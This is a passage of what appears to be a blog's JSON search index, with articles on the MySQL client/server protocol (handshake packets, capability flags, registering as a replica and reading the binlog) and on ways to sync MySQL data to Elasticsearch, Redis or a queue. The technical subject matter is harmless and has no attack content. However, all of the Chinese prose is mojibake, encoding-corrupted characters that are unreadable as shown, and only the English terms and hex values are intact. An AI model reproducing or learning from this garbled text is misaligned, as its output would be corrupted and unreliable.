ï¼Œè¿™ä¸ªåˆå§‹åŒ–æ¡æ‰‹åŒ…çš„æ•°æ®æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿™ä¸ªå›¾ä»ä¸Šå¾€ä¸‹ä¾æ¬¡æ˜¯ï¼š 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œè¡¨ç¤º handshake protocol çš„ç‰ˆæœ¬ï¼Œç°åœ¨éƒ½æ˜¯ 10 ã€‚ ä»¥ NULï¼ˆå³ä¸€ä¸ªå­—èŠ‚ 0x00ï¼‰ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤º MySQL æœåŠ¡å™¨çš„ç‰ˆæœ¬ï¼Œä¾‹å¦‚ 5.7.18-log ã€‚ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œè¡¨ç¤ºçº¿ç¨‹ idï¼Œä¹Ÿæ˜¯è¿™ä¸ªè¿æ¥çš„ idã€‚ 8 ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œauth-plugin-data-part-1 åç»­å¯†ç åŠ å¯†éœ€è¦ç”¨åˆ°çš„éšæœºæ•°çš„å‰ 8 ä½ã€‚ 1 ä¸ªå­—èŠ‚çš„å¡«å……ä½ã€‚ 2 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œcapability_flags_1 å³ Capabilities Flags çš„ä½ä½ 2 ä½å­—èŠ‚ã€‚ 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œè¡¨ç¤ºæœåŠ¡å™¨é»˜è®¤çš„å­—ç¬¦ç¼–ç æ ¼å¼ï¼Œæ¯”å¦‚ utf8_general_ciã€‚ 2 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€æ ‡è¯†ã€‚ 2 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œcapability_flags_2 å³ Capabilities Flags çš„é«˜ä½ 2 ä½å­—èŠ‚ã€‚ 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œå¦‚æœæœåŠ¡å™¨å…·æœ‰ CLIENT_PLUGIN_AUTH çš„èƒ½åŠ›ï¼ˆå…¶å®å°±æ˜¯èƒ½å¤Ÿè¿›è¡Œå®¢æˆ·ç«¯èº«ä»½éªŒè¯ï¼ŒåŸºæœ¬éƒ½æ”¯æŒï¼‰ï¼Œé‚£ä¹ˆä¼ é€’çš„æ˜¯ auth_plugin_data_len å³åŠ å¯†éšæœºæ•°çš„é•¿åº¦ï¼Œå¦åˆ™ä¼ é€’çš„æ˜¯ 0x00 ã€‚ 10 ä¸ªå­—èŠ‚çš„å¡«å……ä½ï¼Œå…¨éƒ¨æ˜¯ 0x00 ã€‚ ç”± auth_plugin_data_len æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œauth-plugin-data-part-2 åŠ å¯†éšæœºæ•°çš„å 13 ä½ã€‚ å¦‚æœæœåŠ¡å™¨å…·æœ‰ CLIENT_PLUGIN_AUTH çš„èƒ½åŠ›ï¼ˆå…¶å®å°±æ˜¯èƒ½å¤Ÿè¿›è¡Œå®¢æˆ·ç«¯èº«ä»½éªŒè¯ï¼ŒåŸºæœ¬éƒ½æ”¯æŒï¼‰ï¼Œé‚£ä¹ˆä¼ é€’çš„æ˜¯ auth_plugin_name å³ç”¨æˆ·è®¤è¯æ–¹å¼çš„åç§°ã€‚ å¯¹äº MySQL 5.x ç‰ˆæœ¬ï¼Œé»˜è®¤çš„ç”¨æˆ·èº«ä»½è®¤è¯æ–¹å¼å«åš mysql_native_passwordï¼ˆå¯¹åº”ä¸Šé¢çš„ auth_plugin_nameï¼‰ï¼Œè¿™ç§è®¤è¯æ–¹å¼çš„ç®—æ³•æ˜¯ï¼š SHA1( password ) XOR SHA1( \"20-bytes random data from server\" \u003cconcat\u003e SHA1( SHA1( password ) ) ) å…¶ä¸­åŠ å¯†æ‰€éœ€çš„ 20 ä¸ªå­—èŠ‚çš„éšæœºæ•°å°±æ˜¯ auth-plugin-data-part-1ï¼ˆ 8 ä½æ•°ï¼‰å’Œ auth-plugin-data-part-2ï¼ˆ 13 ä½ä¸­çš„å‰ 12 ä½æ•°ï¼‰ç»„æˆã€‚ æ³¨æ„ï¼šMySQL ä½¿ç”¨çš„å°ç«¯å­—èŠ‚åºã€‚ çœ‹åˆ°è¿™ï¼Œä½ å¯èƒ½è¿˜å¯¹ Capabilities Flags æ„Ÿåˆ°å¾ˆå›°æƒ‘ã€‚ Capabilities Flags Capabilities Flags å…¶å®å°±æ˜¯ä¸€ä¸ªåŠŸèƒ½æ ‡å¿—ï¼Œç”¨æ¥è¡¨æ˜æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯æ”¯æŒå¹¶å¸Œæœ›ä½¿ç”¨å“ªäº›åŠŸèƒ½ã€‚ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªåŠŸèƒ½æ ‡å¿—ï¼Ÿå› ä¸ºé¦–å…ˆ MySQL æœ‰ä¼—å¤šç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬å¯èƒ½æ”¯æŒçš„åŠŸèƒ½æœ‰åŒºåˆ«ï¼Œæ‰€ä»¥æœåŠ¡ç«¯éœ€è¦è¡¨æ˜å®ƒæ”¯æŒå“ªäº›åŠŸèƒ½ï¼›å…¶æ¬¡ï¼Œå¯¹æœåŠ¡ç«¯æ¥è¯´ï¼Œè¿æ¥å®ƒçš„å®¢æˆ·ç«¯å¯ä»¥æ˜¯å„ç§å„æ ·çš„ï¼Œè¿™äº›å®¢æˆ·ç«¯å¸Œæœ›ä½¿ç”¨å“ªäº›åŠŸèƒ½ä¹Ÿæ˜¯éœ€è¦è¡¨æ˜çš„ã€‚ Capabilities Flags ä¸€èˆ¬æ˜¯ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ¯ä¸ªåŠŸèƒ½éƒ½ç‹¬å ä¸€ä¸ª bit ä½ã€‚ Capabilities Flags é€šå¸¸éƒ½æ˜¯å¤šä¸ªåŠŸèƒ½çš„ç»„åˆè¡¨ç¤ºï¼Œä¾‹å¦‚è¦è¡¨ç¤º CLIENT_PROTOCOL_41ã€CLIENT_PLUGIN_AUTHã€CLIENT_SECURE_CONNECTION è¿™ä¸‰ä¸ªåŠŸèƒ½ï¼Œé‚£ä¹ˆå°±æŠŠä»–ä»¬å¯¹åº”çš„ 0x00000200ã€0x00080000ã€0x00008000 è¿›è¡Œæ¯”ç‰¹ä½æˆ–è¿ç®—å°±èƒ½å¾—åˆ°æœ€ç»ˆçš„å€¼ 0x00088200 ä¹Ÿå°±æ˜¯æœ€ç»ˆçš„ Capabilities Flagsã€‚ æ ¹æ® Capabilities Flags åˆ¤æ–­æ˜¯å¦æ”¯æŒæŸä¸ªåŠŸèƒ½ï¼Œä¾‹å¦‚ Capabilities Flags çš„å€¼æ˜¯ 0x00088200ï¼Œè¦åˆ¤æ–­å®ƒæ˜¯å¦æ”¯æŒ CLIENT_SECURE_CONNECTION çš„åŠŸèƒ½ï¼Œåˆ™ç›´æ¥è¿›è¡Œæ¯”ç‰¹ä½ä¸è¿ç®—å³å¯ï¼Œå³ Capabilities Flags \u0026 CLIENT_SECURE_CONNECTION == CLIENT_SECURE_CONNECTION ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:1:2","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Handshake Response Packet å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ä¸­ï¼Œå½“å®¢æˆ·ç«¯æ”¶åˆ°äº†æœåŠ¡ç«¯çš„ Initial Handshake Packet åï¼Œéœ€è¦å‘æœåŠ¡ç«¯å›åº”ä¸€ä¸ª Handshake Response Packet ï¼ŒåŒ…çš„æ•°æ®æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¾æ¬¡æ˜¯ï¼š 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼ŒCapabilities Flagsï¼Œä¸€å®šè¦è®¾ç½® CLIENT_PROTOCOL_41ï¼Œå¯¹äº MySQL 5.x ç‰ˆæœ¬ï¼Œä½¿ç”¨é»˜è®¤çš„èº«ä»½è®¤è¯æ–¹å¼ï¼Œè¿˜éœ€è¦å¯¹åº”çš„è®¾ç½® CLIENT_PLUGIN_AUTH å’Œ CLIENT_SECURE_CONNECTIONã€‚ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼ŒåŒ…å¤§å°çš„æœ€å¤§å€¼ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯å‘½ä»¤åŒ…çš„å¤§å°ï¼Œæ¯”å¦‚ä¸€æ¡ SQL æœ€å¤šèƒ½å¤šå¤§ã€‚ 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œå­—ç¬¦ç¼–ç æ–¹å¼ã€‚ 23 ä¸ªå­—èŠ‚çš„å¡«å……ä½ï¼Œå…¨æ˜¯ 0x00ã€‚ ä»¥ NULï¼ˆ0x00ï¼‰ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œç™»å½•çš„ç”¨æˆ·åã€‚ CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA ä¸€èˆ¬ä¸ä½¿ç”¨ã€‚ 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œauth_response_lengthï¼Œå¯†ç åŠ å¯†åçš„é•¿åº¦ã€‚ auth_response_length æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯†ç ä¸éšæœºæ•°åŠ å¯†åçš„æ•°æ®ã€‚ å¦‚æœ CLIENT_CONNECT_WITH_DB ç›´æ¥æŒ‡å®šäº†è¿æ¥çš„æ•°æ®åº“ï¼Œåˆ™éœ€è¦ä¼ é€’ä»¥ NULï¼ˆ0x00ï¼‰ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå†…å®¹æ˜¯æ•°æ®åº“åã€‚ CLIENT_PLUGIN_AUTH ä¸€èˆ¬éƒ½éœ€è¦ï¼Œé»˜è®¤æ–¹å¼éœ€è¦ä¼ é€’çš„å€¼å°±æ˜¯ mysql_native_password ã€‚ å¯ä»¥çœ‹åˆ°ï¼ŒHandshake Response Packet ä¸ Initial Handshake Packet å…¶å®æ˜¯ç›¸å¯¹åº”çš„ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:1:3","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"OK_Packet \u0026 ERR_Packet OK_Packet å’Œ ERR_Packet æ˜¯ MySQL æœåŠ¡ç«¯é€šç”¨çš„å“åº”åŒ…ã€‚ MySQL 5.7.5 ç‰ˆæœ¬ä»¥åï¼ŒOK_Packet è¿˜åŒ…å«äº† EOF_Packetï¼ˆç”¨æ¥æ˜¾ç¤ºè­¦å‘Šå’ŒçŠ¶æ€ä¿¡æ¯ï¼‰ã€‚åŒºåˆ† OK_Packet å’Œ EOF_Packet: OK: header = 0x00 and length of packet \u003e 7 EOF: header = 0xfe and length of packet \u003c 9 MySQL 5.7.5 ç‰ˆæœ¬ä¹‹å‰ï¼ŒEOF_Packet æ˜¯ä¸€ä¸ªå•ç‹¬æ ¼å¼çš„åŒ…ï¼š å¦‚æœèº«ä»½è®¤è¯é€šè¿‡ã€è¿æ¥å»ºç«‹æˆåŠŸï¼Œè¿”å›çš„ OK_Packet å°±ä¼šæ˜¯ï¼š 0x07 0x00 0x00 0x02 0x00 0x00 0x00 0x02 0x00 0x00 0x00 å¦‚æœè¿æ¥å¤±è´¥ï¼Œæˆ–è€…å‡ºç°é”™è¯¯åˆ™ä¼šè¿”å› ERR_Packet æ ¼å¼çš„åŒ…ï¼š ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:1:4","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Replication æƒ³è¦è·å–åˆ° master çš„ binlog å—ï¼Ÿåªè¦ä½ å¯¹æ¥å®ç° replication åè®®å³å¯ã€‚ client ä¸ server ä¹‹é—´æˆåŠŸå»ºç«‹è¿æ¥ã€å®Œæˆèº«ä»½è®¤è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ä¸Šæ–‡æ‰€è¿°çš„ connection phase ã€‚ client å‘ server å‘é€ COM_REGISTER_SLAVE åŒ…ï¼Œè¡¨æ˜è¦æ³¨å†Œæˆä¸ºä¸€ä¸ª slave ï¼Œserver å“åº” OK_Packet æˆ–è€… ERR_Packetï¼Œåªæœ‰æˆåŠŸæ‰èƒ½è¿›è¡Œåç»­æ­¥éª¤ã€‚ client å‘ server å‘é€ COM_BINLOG_DUMP åŒ…ï¼Œè¡¨æ˜è¦å¼€å§‹è·å– binlog çš„å†…å®¹ã€‚ server å“åº”æ•°æ®ï¼Œå¯èƒ½æ˜¯ï¼š binlog network streamï¼ˆ binlog ç½‘ç»œæµï¼‰ã€‚ ERR_Packetï¼Œè¡¨ç¤ºæœ‰é”™è¯¯å‘ç”Ÿã€‚ EOF_Packetï¼Œå¦‚æœ COM_BINLOG_DUMP ä¸­çš„ flags è®¾ç½®ä¸ºäº† 0x01 ï¼Œåˆ™åœ¨ binlog æ²¡æœ‰æ›´å¤šæ–°äº‹ä»¶æ—¶å‘é€ EOF_Packetï¼Œè€Œä¸æ˜¯é˜»å¡è¿æ¥ç»§ç»­ç­‰å¾…åç»­ binlog event ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:2:0","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"COM_REGISTER_SLAVE å®¢æˆ·ç«¯å‘ MySQL å‘é€ COM_REGISTER_SLAVE ï¼Œè¡¨æ˜å®ƒè¦æ³¨å†Œæˆä¸ºä¸€ä¸ª slaveï¼ŒåŒ…æ ¼å¼å¦‚ä¸‹å›¾ï¼š é™¤äº† 1 ä¸ªå­—èŠ‚çš„å›ºå®šå†…å®¹ 0x15 å’Œ 4 ä¸ªå­—èŠ‚çš„ server-id ï¼Œå…¶ä»–å†…å®¹é€šå¸¸éƒ½æ˜¯ç©ºæˆ–è€…å¿½ç•¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ user å’Œ password å¹¶ä¸æ˜¯ç™»å½• MySQL çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œåªæ˜¯ slave çš„ä¸€ç§æ ‡è¯†è€Œå·²ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:2:1","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"COM_BINLOG_DUMP æ³¨å†Œæˆä¸º slave ä¹‹åï¼Œå‘é€ COM_BINLOG_DUMP å°±å¯ä»¥å¼€å§‹æ¥å— binlog event äº†ã€‚ 1 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œå›ºå®šå†…å®¹ 0x12 ã€‚ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œbinlog-pos å³ binlog æ–‡ä»¶å¼€å§‹çš„ä½ç½®ã€‚ 2 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œflagsï¼Œä¸€èˆ¬æƒ…å†µä¸‹ slave ä¼šä¸€ç›´ä¿æŒè¿æ¥ç­‰å¾…æ¥å— binlog eventï¼Œä½†æ˜¯å½“ flags è®¾ç½®ä¸ºäº† 0x01 æ—¶ï¼Œå¦‚æœå½“å‰ binlog å…¨éƒ¨æ¥æ”¶å®Œäº†ï¼Œåˆ™æœåŠ¡ç«¯ä¼šå‘é€ EOF_Packet ç„¶åç»“æŸæ•´ä¸ªè¿‡ç¨‹ï¼Œè€Œä¸æ˜¯ä¿æŒè¿æ¥ç»§ç»­ç­‰å¾…åç»­ binlog event ã€‚ 4 ä¸ªå­—èŠ‚çš„æ•´æ•°ï¼Œserver-idï¼Œslave çš„èº«ä»½æ ‡è¯†ï¼ŒMySQL å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ª slave ï¼Œæ¯ä¸ª slave å¿…é¡»æ‹¥æœ‰ä¸åŒçš„ server-idã€‚ ä¸å®šé•¿å­—ç¬¦ä¸²ï¼Œbinlog-filenameï¼Œå¼€å§‹çš„ binlog æ–‡ä»¶åã€‚æŸ¥çœ‹å½“å‰çš„ binlog æ–‡ä»¶åå’Œ pos ä½ç½®ï¼Œå¯ä»¥æ‰§è¡Œ SQL è¯­å¥ show master status ï¼ŒæŸ¥çœ‹æ‰€æœ‰çš„ binlog æ–‡ä»¶ï¼Œå¯ä»¥æ‰§è¡Œ SQL è¯­å¥ show binary logs ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:2:2","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"Binlog Event å®¢æˆ·ç«¯æ³¨å†Œ slave æˆåŠŸï¼Œå¹¶ä¸”å‘é€ COM_BINLOG_DUMP æ­£ç¡®ï¼Œé‚£ä¹ˆ MySQL å°±ä¼šå‘å®¢æˆ·ç«¯å‘é€ binlog network stream å³ binlog ç½‘ç»œæµï¼Œæ‰€è°“çš„ binlog ç½‘ç»œæµå…¶å®å°±æ˜¯æºæºä¸æ–­çš„ binlog event åŒ…ï¼ˆå¯¹ MySQL è¿›è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚ insetã€updateã€delete ç­‰ï¼Œåœ¨ binlog ä¸­æ˜¯ä»¥ä¸€ä¸ªæˆ–å¤šä¸ª binlog event çš„å½¢å¼å­˜åœ¨çš„ï¼‰ã€‚ Replication çš„ä¸¤ç§æ–¹å¼ï¼š å¼‚æ­¥ï¼Œé»˜è®¤æ–¹å¼ï¼Œmaster ä¸æ–­åœ°å‘ slave å‘é€ binlog event ï¼Œæ— éœ€ slave è¿›è¡Œ ack ç¡®è®¤ã€‚ åŠåŒæ­¥ï¼Œmaster å‘ slave æ¯å‘é€ä¸€ä¸ª binlog event éƒ½éœ€è¦ç­‰å¾… ack ç¡®è®¤å›å¤ã€‚ Binlog æœ‰ä¸‰ç§æ¨¡å¼ï¼š statement ï¼Œbinlog å­˜å‚¨çš„æ˜¯åŸå§‹ SQL è¯­å¥ã€‚ row ï¼Œbinlog å­˜å‚¨çš„æ˜¯æ¯è¡Œçš„å®é™…å‰åå˜åŒ–ã€‚ mixed ï¼Œæ··åˆæ¨¡å¼ï¼Œbinlog å­˜å‚¨çš„ä¸€éƒ¨åˆ†æ˜¯ SQL è¯­å¥ï¼Œä¸€éƒ¨åˆ†æ˜¯æ¯è¡Œå˜åŒ–ã€‚ Binlog Event çš„åŒ…æ ¼å¼å¦‚ä¸‹å›¾ï¼š æ¯ä¸ª Binlog Event åŒ…éƒ½æœ‰ä¸€ä¸ªç¡®å®šçš„ event header ï¼Œæ ¹æ® event ç±»å‹çš„ä¸åŒï¼Œå¯èƒ½è¿˜ä¼šæœ‰ post header ä»¥åŠ payload ã€‚ Binlog Event çš„ç±»å‹éå¸¸å¤šï¼š Binlog Management: START_EVENT_V3 FORMAT_DESCRIPTION_EVENT: MySQL 5.x åŠä»¥ä¸Šç‰ˆæœ¬ binlog æ–‡ä»¶ä¸­çš„ç¬¬ä¸€ä¸ª eventï¼Œå†…å®¹æ˜¯ binlog çš„åŸºæœ¬æè¿°ä¿¡æ¯ã€‚ STOP_EVENT ROTATE_EVENT: binlog æ–‡ä»¶å‘ç”Ÿäº†åˆ‡æ¢ï¼Œbinlog æ–‡ä»¶ä¸­çš„æœ€åä¸€ä¸ª eventã€‚ SLAVE_EVENT INCIDENT_EVENT HEARTBEAT_EVENT: å¿ƒè·³ä¿¡æ¯ï¼Œè¡¨æ˜ slave è½åäº† master å¤šå°‘ç§’ï¼ˆæ‰§è¡Œ SQL è¯­å¥ SHOW SLAVE STATUS è¾“å‡ºçš„ Seconds_Behind_Master å­—æ®µï¼‰ã€‚ Statement Based Replication Eventsï¼ˆbinlog ä¸º statement æ¨¡å¼æ—¶ç›¸å…³çš„äº‹ä»¶ï¼‰: QUERY_EVENT: åŸå§‹ SQL è¯­å¥ï¼Œä¾‹å¦‚ insertã€update â€¦ ã€‚ INTVAR_EVENT: åŸºäºä¼šè¯å˜é‡çš„æ•´æ•°ï¼Œä¾‹å¦‚æŠŠä¸»é”®è®¾ç½®ä¸ºäº† auto_increment è‡ªå¢æ•´æ•°ï¼Œé‚£ä¹ˆè¿›è¡Œæ’å…¥æ—¶ï¼Œè¿™ä¸ªå­—æ®µå®é™…å†™å…¥çš„å€¼å°±è®°å½•åœ¨è¿™ä¸ªäº‹ä»¶ä¸­ã€‚ RAND_EVENT: å†…éƒ¨ RAND() å‡½æ•°çš„çŠ¶æ€ã€‚ USER_VAR_EVENT: ç”¨æˆ·å˜é‡äº‹ä»¶ã€‚ XID_EVENT: è®°å½•äº‹åŠ¡ IDï¼Œäº‹åŠ¡ commit æäº¤äº†æ‰ä¼šå†™å…¥ã€‚ Row Based Replication Eventsï¼ˆbinlog ä¸º row æ¨¡å¼æ—¶ç›¸å…³çš„äº‹ä»¶ï¼‰: TABLE_MAP_EVENT: è®°å½•äº†åç»­äº‹ä»¶æ¶‰åŠåˆ°çš„è¡¨ç»“æ„çš„æ˜ å°„å…³ç³»ã€‚ v0 äº‹ä»¶å¯¹åº” MySQL 5.1.0 to 5.1.15 ç‰ˆæœ¬ DELETE_ROWS_EVENTv0: è®°å½•äº†è¡Œæ•°æ®çš„åˆ é™¤ã€‚ UPDATE_ROWS_EVENTv0: è®°å½•äº†è¡Œæ•°æ®çš„æ›´æ–°ã€‚ WRITE_ROWS_EVENTv0: è®°å½•äº†è¡Œæ•°æ®çš„æ–°å¢ã€‚ v1 äº‹ä»¶å¯¹åº” MySQL 5.1.15 to 5.6.x ç‰ˆæœ¬ DELETE_ROWS_EVENTv1: è®°å½•äº†è¡Œæ•°æ®çš„åˆ é™¤ã€‚ UPDATE_ROWS_EVENTv1: è®°å½•äº†è¡Œæ•°æ®çš„æ›´æ–°ã€‚ WRITE_ROWS_EVENTv1: è®°å½•äº†è¡Œæ•°æ®çš„æ–°å¢ã€‚ v2 äº‹ä»¶å¯¹åº” MySQL 5.6.x åŠå…¶ä»¥ä¸Šç‰ˆæœ¬ DELETE_ROWS_EVENTv2: è®°å½•äº†è¡Œæ•°æ®çš„åˆ é™¤ã€‚ UPDATE_ROWS_EVENTv2: è®°å½•äº†è¡Œæ•°æ®çš„æ›´æ–°ã€‚ WRITE_ROWS_EVENTv2: è®°å½•äº†è¡Œæ•°æ®çš„æ–°å¢ã€‚ LOAD INFILE replicationï¼ˆåŠ è½½æ–‡ä»¶çš„ç‰¹æ®Šåœºæ™¯ï¼Œæœ¬æ–‡ä¸åšä»‹ç»ï¼‰: LOAD_EVENT CREATE_FILE_EVENT APPEND_BLOCK_EVENT EXEC_LOAD_EVENT DELETE_FILE_EVENT NEW_LOAD_EVENT BEGIN_LOAD_QUERY_EVENT EXECUTE_LOAD_QUERY_EVENT æƒ³è¦è§£æå…·ä½“æŸä¸ª binlog event çš„å†…å®¹ï¼Œåªè¦å¯¹ç…§å®˜æ–¹æ–‡æ¡£æ•°æ®åŒ…çš„æ ¼å¼å³å¯ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:2:3","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"ç»“è¯­ MySQL Client/Server Protocol åè®®å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯ç›¸äº’ä¹‹é—´æŒ‰ç…§çº¦å®šçš„æ ¼å¼å‘åŒ…ï¼Œè€Œç†è§£äº†åè®®ï¼Œç›¸ä¿¡ä½ è‡ªå·±å°±å¯ä»¥å®ç°ä¸€ä¸ª lib å»æ³¨å†Œæˆä¸ºä¸€ä¸ª slave ç„¶åè§£æ binlog ã€‚ ","date":"2020-12-20","objectID":"/protocol-connectionreplication/:3:0","tags":["MySQL"],"title":"è§£è¯» MySQL Client/Server Protocol: Connection \u0026 Replication","uri":"/protocol-connectionreplication/"},{"categories":["MySQL"],"content":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æŠŠ MySQL çš„æ•°æ®åŒæ­¥è‡³å…¶å®ƒæ•°æ®æºï¼Œä¹Ÿå°±æ˜¯åœ¨å¯¹ MySQL çš„æ•°æ®è¿›è¡Œäº†æ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤ç­‰æ“ä½œåï¼ŒæŠŠè¯¥æ•°æ®ç›¸å…³çš„ä¸šåŠ¡é€»è¾‘å˜æ›´ä¹Ÿåº”ç”¨åˆ°å…¶å®ƒæ•°æ®æºï¼Œä¾‹å¦‚ï¼š MySQL -\u003e Elasticsearch ï¼ŒåŒæ­¥ ES çš„ç´¢å¼• MySQL -\u003e Redis ï¼Œåˆ·æ–°ç¼“å­˜ MySQL -\u003e MQ (å¦‚ Kafka ç­‰) ï¼ŒæŠ•é€’æ¶ˆæ¯ æœ¬æ–‡æ€»ç»“äº†äº”ç§æ•°æ®åŒæ­¥çš„æ–¹å¼ã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:0:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"1. ä¸šåŠ¡å±‚åŒæ­¥ ç”±äºå¯¹ MySQL æ•°æ®çš„æ“ä½œä¹Ÿæ˜¯åœ¨ä¸šåŠ¡å±‚å®Œæˆçš„ï¼Œæ‰€ä»¥åœ¨ä¸šåŠ¡å±‚åŒæ­¥æ“ä½œå¦å¤–çš„æ•°æ®æºä¹Ÿæ˜¯å¾ˆè‡ªç„¶çš„ï¼Œæ¯”è¾ƒå¸¸è§çš„åšæ³•å°±æ˜¯åœ¨ ORM çš„ hooks é’©å­é‡Œç¼–å†™ç›¸å…³åŒæ­¥ä»£ç ã€‚ è¿™ç§æ–¹å¼çš„ç¼ºç‚¹æ˜¯ï¼Œå½“æœåŠ¡è¶Šæ¥è¶Šå¤šæ—¶ï¼ŒåŒæ­¥çš„éƒ¨åˆ†å¯èƒ½ä¼šè¿‡äºåˆ†æ•£ä»è€Œå¯¼è‡´éš¾ä»¥æ›´æ–°è¿­ä»£ï¼Œä¾‹å¦‚å¯¹ ES ç´¢å¼•è¿›è¡Œä¸å…¼å®¹è¿ç§»æ—¶å°±å¯èƒ½ä¼šç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:1:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"2. ä¸­é—´ä»¶åŒæ­¥ å½“åº”ç”¨æ¶æ„æ¼”å˜ä¸ºå¾®æœåŠ¡æ—¶ï¼Œå„ä¸ªæœåŠ¡é‡Œå¯èƒ½ä¸å†ç›´æ¥è°ƒç”¨ MySQL ï¼Œè€Œæ˜¯é€šè¿‡ä¸€å±‚ middleware ä¸­é—´ä»¶ï¼Œè¿™æ—¶å€™å°±å¯ä»¥åœ¨ä¸­é—´ä»¶æ“ä½œ MySQL çš„åŒæ—¶åŒæ­¥å…¶å®ƒæ•°æ®æºã€‚ è¿™ç§æ–¹å¼éœ€è¦ä¸­é—´ä»¶å»é€‚é…ï¼Œå…·æœ‰ä¸€å®šå¤æ‚åº¦ã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:2:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ ç­‰çš„äº”ç§æ–¹å¼","uri":"/sync-data-from-mysql/"},{"categories":["MySQL"],"content":"3. å®šæ—¶ä»»åŠ¡æ ¹æ® updated_at å­—æ®µåŒæ­¥ åœ¨ MySQL çš„è¡¨ç»“æ„é‡Œè®¾ç½®ç‰¹æ®Šçš„å­—æ®µï¼Œå¦‚ updated_atï¼ˆæ•°æ®çš„æ›´æ–°æ—¶é—´ï¼‰ï¼Œæ ¹æ®æ­¤å­—æ®µï¼Œç”±å®šæ—¶ä»»åŠ¡å»æŸ¥è¯¢å®é™…å˜æ›´çš„æ•°æ®ï¼Œä»è€Œå®ç°æ•°æ®çš„å¢é‡æ›´æ–°ã€‚ è¿™ç§æ–¹å¼ä½ å¯ä»¥ä½¿ç”¨å¼€æºçš„ Logstash å»å®Œæˆã€‚ å½“ç„¶ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯æ— æ³•åŒæ­¥æ•°æ®çš„åˆ é™¤æ“ä½œã€‚ ","date":"2020-11-30","objectID":"/sync-data-from-mysql/:3:0","tags":["MySQL"],"title":"åŒæ­¥ MySQL æ•°æ®è‡³ Elasticsearch/Redis/MQ 